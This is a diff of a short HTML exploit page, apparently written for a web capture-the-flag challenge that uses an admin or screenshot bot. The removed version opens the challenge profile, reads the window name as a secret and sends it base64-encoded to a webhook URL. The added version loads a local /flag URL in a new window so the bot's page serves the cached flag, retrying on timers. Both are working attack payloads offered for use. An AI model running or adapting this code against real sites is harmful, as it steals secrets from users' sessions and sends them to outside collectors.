@@ -1,26 +1,18 @@
-<!DOCTYPE html>
+<!doctype html>
 <html>
 <body>
-    <script>
-        // 1. We open the challenge profile.
-        // 2. This new window's 'opener' is OUR page.
-        const win = window.open('http://challenge01.root-me.org:58003/profile');
+<script>
+  // 1) Prime cache with a request likely sent without page-level extra headers
+  const w = window.open('about:blank', '_blank');
+  if (w) w.location = 'http://127.0.0.1:5000/flag';
 
-        // 3. We wait for the admin's page to load.
-        setTimeout(() => {
-            // 4. Since we can't read 'win.document', we check if the 
-            // secret was placed into the 'window.name' of the opened window.
-            // In many challenges, the admin's secret IS the window name.
-            const secret = win.name;
+  // 2) Navigate the screenshot page to same URL so Chromium serves cached response
+  setTimeout(() => {
+    location.href = 'http://127.0.0.1:5000/flag';
+  }, 200);
 
-            if (secret) {
-                fetch('https://webhook.build/api/webhook/1ebfbe39-d596-4e8c-b261-3b05cbfe9b45?secret=' + btoa(secret));
-            } else {
-                // 5. If that fails, the secret might be in the OPENER'S name.
-                // We redirect the admin's window to OUR webhook.
-                win.location = 'https://webhook.build/api/webhook/1ebfbe39-d596-4e8c-b261-3b05cbfe9b45?info=redirected';
-            }
-        }, 2000);
-    </script>
+  // Optional: if timing is tight, keep retrying quickly
+  setTimeout(() => { location.href = 'http://127.0.0.1:5000/flag'; }, 600);
+</script>
 </body>
 </html>
